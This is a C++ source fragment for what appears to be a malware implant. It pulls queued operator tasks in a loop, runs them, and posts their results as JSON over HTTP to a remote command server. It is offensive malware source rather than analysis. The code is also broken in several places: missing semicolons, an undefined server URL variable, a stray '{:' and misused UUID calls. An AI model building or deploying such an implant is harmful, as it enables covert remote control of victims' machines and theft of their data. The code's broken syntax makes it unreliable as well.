#include "implant.h"

[[nodiscard]] std::string sendHttpRequest(std::string_view host, 
    std::string_view port,std::string_view uri,std::string_view payload) {
  auto const requestBody = json::parse(payload)
  std::stringstream ss;

  cpr::AsyncResponse asyncRequest = cpr::PostAsync(cpr::Url{ fullServerUrl},
        cpr::Body{ requestBody.dump()}
        cpr::Header{{"Content-Type", "application/json"}}
        );
  cpr::Response response = asyncRequest.get();

  std::cout << "Request data" << requestBody << std::endl;

  return response.text;
}


[[nodiscard]] std::string Implant::sendResults(){

  boost::property_tree::ptree resultsLocal;

  {
    std::scoped_lock<std::mutex> resultsLock{ resultsMutex};
    resultsLocal.swap(results);
  }

  std::stringstream resultsStringStream;
  boost::property_tree::write_json(resultsStringStream, resultsLocal );
  return sendHttpRequest(host, port, uri, resultsStringStream.str())
}

void Implant::serviceTasks() {
  while(isRunning) {
    std::vector<Task> localTasks;
    {
      std::scoped_lock<std::mutex> taskLock{taskMutex};
      tasks.swap(localTasks);
    }

    for (const auto& task: localTasks) {:
      const auto [id, contents, success] = std::visit([](const auto& task) 
          {return task.run();}, task);
      {
        std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
        results.add(boost::uuids::to_string(id + ".contents", contents));
        results.add(boost::uuids::to_string(id + ".success", success));
      }
    }

    std::this_thread::sleep_for(std::chrono::seconds{1});
  }
}
